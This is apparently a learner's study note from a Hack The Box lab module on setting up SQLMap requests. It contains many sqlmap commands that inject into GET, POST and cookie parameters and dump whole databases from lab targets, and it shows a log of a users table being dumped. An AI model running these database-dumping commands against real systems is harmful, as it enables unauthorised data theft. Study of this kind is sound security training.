SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.

In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability

---
## Curl Commands
`Copy as cURL`

![[8t1151o3.png]]

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:
```bash
AhmaDb0x@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`)


## GET/POST Requests
`GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used

`POST` parameters `uid` and `name` will be tested for SQLi vulnerability.:
```bash
AhmaDb0x@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
parameter `uid` is prone to an SQLi vulnerability:
```bash
AhmaDb0x@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

---


## Full HTTP Requests

![HTTP GET request to www.example.com with headers including User-Agent and Accept-Language.](https://academy.hackthebox.com/storage/modules/58/x7ND6VQ.png)


capture request from burp or inspect make it in .txt > use -r in `sqlmap`
```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

```bash
AhmaDb0x@htb[/htb]$ sqlmap -r req.txt
```
>Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.



## Custom SQLMap Requests
```bash
AhmaDb0x@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
`-H` for raw headers
```bash
AhmaDb0x@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

```bash
sqlmap -u "http://94.237.58.78:43299/index.php?id=1" --cookie="PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"

```
POST form:
```bash
sqlmap -u "http://94.237.58.78:43299/login.php" --data="username=admin&password=admin" --cookie="PHPSESSID=..." 
```

>sqlmap -r request.txt

This is the best way to use sqlmap on real-world apps.

---
```shell-session
AhmaDb0x@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```
```shell-session
--method PUT
```


###### Use options "--batch --dump" to automatically dump all data.

###### Try to see where the 'id=1' is sent, and specify this location as the injection mark.

###### When dealing with complex HTTP requests, it's best to use sqlmap with the '-r' option.


sqlmap -u "http://94.237.51.14:49563/case2.php?id=1" --batch --dump

sqlmap -u "http://94.237.51.14:49563/case2.php?id=1" --cookie="PHPSESSID=your-session-id" --batch --dump


POST parameter id

```bash
sqlmap -u "http://94.237.51.14:49563/case2.php" --data="id=1" --batch --dump

```

```bash
sqlmap -u "http://94.237.51.14:49563/case2.php" \
--data="id=1" \
--cookie="PHPSESSID=your-session-id" \
--batch --dump

```

19:49:19] [INFO] table 'testdb.users' dumped to CSV file '/home/pwn/.local/share/sqlmap/output/94.237.51.14/dump/testdb/users.csv'                                                                                                                 
[19:49:19] [INFO] fetched data logged to text files under '/home/pwn/.local/share/sqlmap/output/94.237.51.14'


vulnerability in Cookie value id=1

```bash
sqlmap -u "http://94.237.51.14:49563/case3.php" \
--cookie="id=*" \
--batch --dump

```


```bash
┌──(pwn㉿kali)-[~]
└─$ sqlmap -r req.txt --threads 10 --dump -T flag4 --batch
```


1. Be on the list of cases and have requests intercepted ready.
2. Click “Forward” until you catch the expected request
3. Copy the request to a file
4. sqlmap -r case4.txt --batch --dump

sqlmap -u [http://IP](http://IP):PORT/case4.php/ --data=‘{“id”:1}’ --batch --dump

